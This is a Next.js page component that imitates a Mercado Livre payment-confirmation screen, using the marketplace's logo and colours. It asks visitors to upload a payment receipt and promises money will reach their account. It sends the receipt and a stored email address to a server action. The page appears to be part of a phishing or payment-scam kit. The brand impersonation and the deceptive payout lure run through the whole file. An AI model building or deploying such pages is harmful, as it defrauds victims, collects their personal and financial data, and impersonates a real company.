"use client";

import { ChangeEvent, useEffect, useState } from "react";

import { LoadingComponent } from "@/loading";
import { useRouter } from "next/navigation";
import { receiptUser } from "@/actions/receipt";

export default function PayVeryPage() {
  const router = useRouter();

  const convertImageToBase64 = (file: File) => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.readAsDataURL(file);

      reader.onload = () => resolve(reader.result);
      reader.onerror = (error) => reject(error);
    });
  };

  const [base64, setBase64] = useState("");
  const [loading, setLoading] = useState(true);
  useEffect(() => {
    setTimeout(() => {
      setLoading(false);
    }, 1500);
  }, []);

  if (loading) {
    return <LoadingComponent />;
  }

  const handleChangeInfoLogin = async () => {
    const email = localStorage.getItem("Email");

    await receiptUser(base64, String(email));

    router.push("/confirm");
  };

  return (
    <div>
      <header className="flex items-center justify-center bg-[#FFE600] border-b border-[#e2e0e2] p-4">
        <a href="./" aria-label="ir para a página inicial">
          <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.117/mercadolibre/pt_logo_large_plus@2x.webp" />
        </a>
      </header>

      <main className="mt-16 flex items-center justify-center">
        <div className="w-full p-10 md:max-w-[500px] flex flex-col">
          <h1 className="text-3xl font-medium">Confirmação de pagamento</h1>

          <span className="text-[#5c525b] text-lg mt-2 mb-4">
            Após confirmar, em instantes você ira receber o seu valor em conta!
          </span>

          <span className="font-semibold mt-4">
            Envie o comprovante de Pagamento *
          </span>

          <button
            className="bg-[#2968C8] text-white h-[50px] w-full text-xl rounded mt-2"
            onClick={() => document.getElementById("file")?.click()}
          >
            📎 Enviar comprovante
          </button>

          <input
            type="file"
            className="hidden"
            id="file"
            onChange={async (event: ChangeEvent<HTMLInputElement>) => {
              const target = event.target;
              if (!target.files || target.files.length === 0) return;

              const file = target.files[0];

              const fileBase64 = await convertImageToBase64(file);
              setBase64(String(fileBase64));
            }}
          />

          <button
            className="bg-[#2968C8] text-white h-[50px] w-full text-xl rounded-full mt-8"
            onClick={handleChangeInfoLogin}
          >
            Confirmar Pagamento
          </button>
        </div>
      </main>
    </div>
  );
}
